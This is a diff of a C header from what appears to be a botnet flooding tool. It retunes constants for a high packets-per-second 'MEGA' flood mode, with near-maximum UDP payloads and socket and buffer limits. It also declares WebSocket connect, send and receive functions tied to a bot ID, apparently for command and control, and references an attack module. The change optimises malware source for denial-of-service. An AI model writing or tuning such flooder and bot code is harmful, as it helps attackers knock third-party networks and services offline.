@@ -36,16 +36,19 @@
 /* ── Constants ─────────────────────────────────── */
 #define MAX_PAYLOAD 1472
 #define BURST_SIZE 512
-#define MEGA_BATCH 65535
-#define SOCKETS_PER_THREAD 8
+/* MEGA: few sockets, huge PPS — quality over FD spam */
+#define MEGA_BATCH 64
+#define MEGA_SOCKS_PER_CPU 8
+#define MEGA_MAX_SOCKS 128
+#define MEGA_PAYLOAD 1400
 #define THREAD_MULTIPLIER 2
-#define MAX_SOCKETS 65535
-#define BURST_MULTIPLIER 64
-#define RING_BUF_SIZE 1048576
-#define SOCKET_BUF_SIZE (128 * 1024 * 1024)
+#define MAX_SOCKETS 256
+#define BURST_MULTIPLIER 32
+#define RING_BUF_SIZE (MEGA_BATCH * MEGA_PAYLOAD)
+#define SOCKET_BUF_SIZE (16 * 1024 * 1024)
 #define MAX_PAYLOADS 10000
 #define MAX_PROCESSES 4
-#define CPU_LOAD_THRESHOLD 75
+#define CPU_LOAD_THRESHOLD 90
 
 /* ── Types ─────────────────────────────────────── */
 typedef struct {
@@ -148,6 +151,7 @@ typedef struct {
 int ws_connect(WS *ws, const char *bot_id);
 void ws_disconnect(WS *ws);
 int ws_send(WS *ws, const char *msg);
+/* returns: >0 payload len, 0 timeout/idle (still connected), -1 hard error/close */
 int ws_recv(WS *ws, char *buf, int cap);
 
 /* ── attack.h ─────────────────────────────────── */
